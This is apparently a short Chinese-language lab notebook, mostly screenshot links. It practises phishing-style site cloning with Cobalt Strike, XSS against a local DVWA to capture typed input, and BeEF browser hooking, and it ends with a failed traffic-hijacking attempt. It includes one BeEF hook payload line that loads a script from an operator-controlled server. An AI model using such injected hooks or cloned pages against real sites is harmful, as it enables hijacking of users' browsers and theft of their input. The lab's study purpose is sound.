cobalt strike server启动！

![image-20260629171254907](images/image-20260629171254907.png)

cobaltstrike client启动！

![image-20260629171332049](images/image-20260629171332049.png)

找到克隆网站

![image-20260629171407967](images/image-20260629171407967.png)

apache启动

![image-20260629174217015](images/image-20260629174217015.png)

![image-20260629174234249](images/image-20260629174234249.png)

嗯，这里还是用dvwa演示吧

![image-20260629174517895](images/image-20260629174517895.png)

![image-20260629175701238](images/image-20260629175701238.png)

换一个

![image-20260629181556249](images/image-20260629181556249.png)

进来了

![image-20260629182332982](images/image-20260629182332982.png)

打开web日志

![image-20260629183003541](images/image-20260629183003541.png)

可以看到输入内容



ok从头到尾我顺一遍

1、写一个eval.js弹窗，打开服务器

![image-20260629183941454](images/image-20260629183941454.png)

![image-20260629184001692](images/image-20260629184001692.png)

2、打开本地dvwa，在xss处插入代码

![image-20260629184230706](images/image-20260629184230706.png)

3、发现弹窗，点进去看看

![image-20260629184309370](images/image-20260629184309370.png)

4、发现url变了，此时输入都可在客户端看到

![image-20260629184401497](images/image-20260629184401497.png)

![image-20260629184521708](images/image-20260629184521708.png)

![image-20260629184529584](images/image-20260629184529584.png)

5、存储型注入后从其他地方访问也是一样有用

![image-20260629184637572](images/image-20260629184637572.png)

可以看到我啥也没干就弹了这个





**xss的beef**

1、启动beef

![image-20260629192845760](images/image-20260629192845760.png)

Example: <script src="http://127.0.0.1:3000/hook.js"></script>

2、打开beef控制面板

![image-20260629192929893](images/image-20260629192929893.png)

3、注入

![image-20260629193316229](images/image-20260629193316229.png)

4、再看控制面板

![image-20260629193631472](images/image-20260629193631472.png)

5、execute

![image-20260629193705062](images/image-20260629193705062.png)







**流量劫持**

![image-20260629195033084](images/image-20260629195033084.png)

开了困难模式没跳转成功